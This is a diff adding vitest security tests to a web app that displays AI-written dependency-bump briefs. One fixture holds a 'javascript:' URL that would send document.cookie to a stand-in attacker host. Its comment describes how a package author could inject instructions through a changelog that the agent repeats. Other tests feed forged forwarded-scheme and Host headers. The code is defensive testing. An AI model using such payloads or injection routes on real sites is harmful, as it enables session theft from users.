@@ -1,5 +1,6 @@
 import { rm, writeFile } from 'node:fs/promises';
 import { beforeEach, describe, expect, it, vi } from 'vitest';
+import type { BriefContent } from '../core/brief.js';
 import { LOCKFILE_POLICY, PER_RUN_BUDGETS, RUN_TIME_BUDGET_SECONDS } from '../core/policy.js';
 import type { BumpRecord, WatchedRepository } from '../core/records.js';
 import { bumpPath, projectPath } from '../core/routes.js';
@@ -191,6 +192,41 @@ describe('the bump detail', () => {
     );
   });
 
+  /**
+   * The claim source is the model's own words about release notes a package author wrote, so a
+   * package author who wants a script on this page writes the instruction into a changelog and
+   * waits. The claim is still shown, because hiding what the agent said would be worse; only its
+   * link is refused.
+   */
+  it('prints a claim source that is not a web address without making it clickable', async () => {
+    const poisoned = bumpRecord({
+      key: 'voyagi/demo-app#lodash@5.0.0',
+      repositoryId: DEMO.id,
+      dependency: 'lodash',
+      candidateVersion: '5.0.0',
+      brief: readyBrief({
+        content: {
+          ...(readyBrief().content as BriefContent),
+          breaksHere: [
+            {
+              path: 'src/index.ts',
+              line: 3,
+              symbol: 'merge',
+              quote: 'merge was removed',
+              source: 'javascript:fetch("https://evil.example.net?c="+document.cookie)',
+              verified: true,
+            },
+          ],
+        },
+      }),
+    });
+    await store.saveBump(poisoned);
+
+    const body = await text(store, bumpPath(DEMO.id, poisoned.key));
+    expect(body).not.toContain('href="javascript:');
+    expect(body).toContain('evil.example.net');
+  });
+
   it('says the brief is unavailable rather than inventing one', async () => {
     const green = greenBump();
     const body = await text(store, bumpPath(DEMO.id, green.key));
@@ -298,6 +334,36 @@ describe('what the crawlers read', () => {
     expect(body).toContain('User-agent: *');
     expect(body).toContain('Sitemap: https://bumpwarden.example.run/sitemap.xml');
     expect(body).not.toContain('Sitemap: /');
+  });
+
+  /**
+   * The Sitemap line has to be absolute, so an instance with no configured base url has to read
+   * the host from the request. That makes the scheme beside it caller-controlled as well, and a
+   * proxy header naming any scheme it liked would publish a url nothing can fetch.
+   */
+  it('takes a forwarded scheme only when it is one this service is reached over', async () => {
+    const bare = createApp({ store, baseUrl: null });
+
+    const https = await bare.request('http://local/robots.txt', {
+      headers: { 'x-forwarded-proto': 'https' },
+    });
+    expect(await https.text()).toContain('Sitemap: https://local/sitemap.xml');
+
+    for (const forged of ['ftp', 'javascript', 'gopher', 'https evil']) {
+      const response = await bare.request('http://local/robots.txt', {
+        headers: { 'x-forwarded-proto': forged },
+      });
+      expect(await response.text(), forged).toContain('Sitemap: http://local/sitemap.xml');
+    }
+  });
+
+  it('publishes the configured url rather than the requested host, whatever the Host says', async () => {
+    const response = await app(store).request('http://local/sitemap.xml', {
+      headers: { host: 'evil.example.net' },
+    });
+    const body = await response.text();
+    expect(body).toContain('https://bumpwarden.example.run/');
+    expect(body).not.toContain('evil.example.net');
   });
 
   it('falls back to the requested host when the service has no configured url', async () => {
@@ -450,6 +516,26 @@ describe('Run now', () => {
       method: 'POST',
     });
     expect(response.status).toBe(503);
+  });
+
+  /**
+   * The refusal above is proven against a run already recorded as running. A press that arrives
+   * while another is still between its own read and its claim gets past that check, and the
+   * orchestrator refuses it instead. 409 rather than the 500 an unhandled throw would give.
+   */
+  it('answers 409 when the orchestrator refuses a second concurrent run', async () => {
+    const startRun = vi.fn(async () => {
+      const refused = new Error('a run is already going');
+      refused.name = 'RunInProgressError';
+      throw refused;
+    });
+    const response = await app(store, { startRun }).request(
+      `http://local${projectPath(DEMO.id)}/run`,
+      { method: 'POST', headers: { accept: 'application/json' } },
+    );
+
+    expect(response.status).toBe(409);
+    expect(await response.json()).toMatchObject({ state: 'running' });
   });
 
   it('hides the control entirely on a project a visitor may not run', async () => {
